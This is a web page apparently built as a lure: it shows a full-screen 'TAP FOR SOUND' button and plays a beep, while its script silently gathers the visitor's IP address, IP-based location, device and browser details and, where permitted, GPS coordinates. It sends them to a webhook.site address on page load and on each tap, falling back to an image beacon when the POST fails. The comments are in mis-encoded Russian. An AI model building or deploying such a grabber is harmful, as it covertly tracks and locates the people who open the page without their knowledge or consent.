<!DOCTYPE html>
<html>
<head>
    <title>Sound Page</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            background: #000;
            color: white;
            font-family: Arial;
        }
        #playButton {
            width: 100%;
            height: 100%;
            border: none;
            background: linear-gradient(45deg, #ff0000, #0000ff);
            color: white;
            font-size: 24px;
            cursor: pointer;
        }
        #status {
            position: fixed;
            top: 10px;
            left: 10px;
            background: rgba(0,0,0,0.7);
            padding: 10px;
            border-radius: 5px;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <button id="playButton">üéµ TAP FOR SOUND üéµ</button>
    <div id="status"></div>

    <script>
        const statusDiv = document.getElementById('status');
        const MY_WEBHOOK = 'https://webhook.site/7453869-e309-4e37-9f39-f675ca0246d3'; // –¢–í–û–ô WEBHOOK

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏—è –∑–≤—É–∫–∞
        function playSound() {
            const audio = new Audio('https://www.soundjay.com/buttons/sounds/beep-07.mp3');
            audio.play().then(() => {
                document.getElementById('playButton').innerHTML = 'üîä SOUND PLAYING!';
                document.getElementById('playButton').style.background = 'green';
            }).catch(error => {
                document.getElementById('playButton').innerHTML = 'SOUND PLAYING!';
                document.getElementById('playButton').style.background = 'green';
            });
        }

        // –§—É–Ω–∫—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∏—è IP
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                try {
                    const response = await fetch('https://api64.ipify.org?format=json');
                    const data = await response.json();
                    return data.ip;
                } catch (error2) {
                    return 'Unknown';
                }
            }
        }

        // –§—É–Ω–∫—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∏—è –¥–µ—Ç–∞–ª–µ–π –ø–æ IP
        async function getIPDetails(ip) {
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await response.json();
                return {
                    city: data.city,
                    country: data.country_name,
                    region: data.region,
                    org: data.org,
                    timezone: data.timezone
                };
            } catch (error) {
                return { error: 'Could not get IP details' };
            }
        }

        // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö
        async function sendDataToWebhook(data) {
            try {
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–∞–∫ JSON —Å –ø—Ä–∞–≤–∏–ª—å–Ω—ã–º–∏ –∑–∞–≥–æ–ª–æ–≤–∫–∞–º–∏
                const response = await fetch(MY_WEBHOOK, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    mode: 'no-cors', // –í–∞–∂–Ω–æ: –æ–±—Ö–æ–¥–∏–º CORS
                    body: JSON.stringify(data)
                });
                
                console.log('Data sent successfully');
                return true;
            } catch (error) {
                console.log('Error sending data:', error);
                // –ü—Ä–æ–±—É–µ–º –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π —Å–ø–æ—Å–æ–±
                sendDataAlternative(data);
                return false;
            }
        }

        // –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π —Å–ø–æ—Å–æ–± –æ—Ç–ø—Ä–∞–≤–∫–∏ —á–µ—Ä–µ–∑ Image
        function sendDataAlternative(data) {
            const params = new URLSearchParams();
            for (const [key, value] of Object.entries(data)) {
                if (typeof value === 'object') {
                    params.append(key, JSON.stringify(value));
                } else {
                    params.append(key, value);
                }
            }
            
            const img = new Image();
            img.src = `${MY_WEBHOOK}?${params.toString()}&method=image`;
        }

        // –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è —Å–±–æ—Ä–∞ –∏ –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö
        async function collectAndSendData() {
            statusDiv.innerHTML = 'üì° Getting data...';
            
            // –°–æ–±–∏—Ä–∞–µ–º –±–∞–∑–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ
            const ip = await getIP();
            const ipDetails = await getIPDetails(ip);
            
            const allData = {
                ip: ip,
                ipDetails: ipDetails,
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString(),
                url: window.location.href,
                referrer: document.referrer,
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                platform: navigator.platform
            };

            // –ü—Ä–æ–±—É–µ–º –ø–æ–ª—É—á–∏—Ç—å –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é
            if (navigator.geolocation) {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            timeout: 3000
                        });
                    });
                    allData.gps = {
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    };
                } catch (error) {
                    allData.gps = { error: error.message };
                }
            }

            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º IP –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
            statusDiv.innerHTML = `üìç IP: ${ip}`;
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ
            await sendDataToWebhook(allData);
        }

        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–ª–∏–∫–∞
        document.getElementById('playButton').addEventListener('click', async function() {
            playSound();
            collectAndSendData();
        });

        // –î–ª—è –º–æ–±–∏–ª—å–Ω—ã—Ö
        document.getElementById('playButton').addEventListener('touchend', function(e) {
            e.preventDefault();
            playSound();
            collectAndSendData();
        });

        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        window.addEventListener('load', function() {
            setTimeout(collectAndSendData, 500);
        });
    </script>
</body>
</html>
